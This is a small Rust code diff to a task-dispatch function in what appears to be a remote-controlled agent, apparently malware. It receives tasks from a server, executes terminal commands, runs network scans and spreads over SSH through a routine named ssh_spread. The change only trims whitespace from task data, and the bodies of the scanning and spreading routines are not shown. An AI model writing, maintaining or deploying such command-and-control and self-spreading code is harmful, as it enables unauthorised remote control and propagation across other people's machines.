@@ -237,7 +237,7 @@ pub fn run_task(task: Task) {
     // Add more command types here when supported by server and implemented in client
     match &task.name[..] {
         TERMINAL_CMD => {
-            let child = terminal_command(task.data);
+            let child = terminal_command(task.data.trim().to_string());
             let rt = RunningTask {
                 id: task.id,
                 child,
@@ -261,12 +261,14 @@ pub fn run_task(task: Task) {
                 network_scan::network_scan(
                     &RUNNING_TASKS,
                     task.id,
-                    task.data);
+                    task.data.trim().to_string());
             });
         }
         SSH_SPREAD => {
             thread::spawn(|| {
-                ssh_spread(&RUNNING_TASKS, task.id, task.data);
+                ssh_spread(&RUNNING_TASKS,
+                           task.id,
+                           task.data.trim().to_string());
             });
         }
         _ => {}
